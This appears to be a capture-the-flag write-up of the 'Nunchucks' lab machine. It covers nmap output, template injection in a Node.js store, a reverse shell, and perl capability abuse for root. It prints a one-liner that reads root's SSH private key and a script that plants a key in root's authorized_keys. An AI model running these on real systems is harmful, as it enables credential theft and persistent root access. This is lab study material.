# Nunchuncks

---

## Enumeration

- nmap:

```
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c146dbb7459c3782e48f511d85b4721 (RSA)
|   256 a2f42c427465a37c26dd497223827271 (ECDSA)
|_  256 e18d44e7216d7c132fea3b8358aa02b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 4BD6ED13BE03ECBBD7F9FA7BAA036F95
|_http-title: Nunchucks - Landing Page
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Issuer: commonName=Nunchucks-CA/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-08-30T15:42:24
| Not valid after:  2031-08-28T15:42:24
| MD5:   57fc410de8091ce682f97bee4f396fe4
|_SHA-1: 518c0fd1690375c0f26ba6cbe37d53b8a3ff858b
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Scan reveals domain name since it does redirects: `nunchucks.htb` -> /etc/hosts
- port 80 redirects to https port 443
- Found subdomain `store`
- Login & Register is down on main domain
- Email submission on store.nunchucks.htb is vulnerable to SSTI!!
- Wrote python script to start hacking. pwn.py
- After tinkering around, it's using NUNJUCKS (NodeJS), also in response header we can see powered by express
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

---

## Lateral movement

- Developed python script, added option to get revshell on port 9000
- got user.txt!

---

## PrivEsc

- getcap -r / 2>/dev/null
- https://gtfobins.github.io/gtfobins/perl/#capabilities
- perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "cat /root/.ssh/id_rsa";'
- Still couldn't get root flag


- script:

```perl
#!/usr/bin/perl

use POSIX qw(setuid);
POSIX::setuid(0);
exec "echo [RSA_PUB] > /root/.ssh/authorized_keys";
```
- Used SSH with private key to log in as root.

---

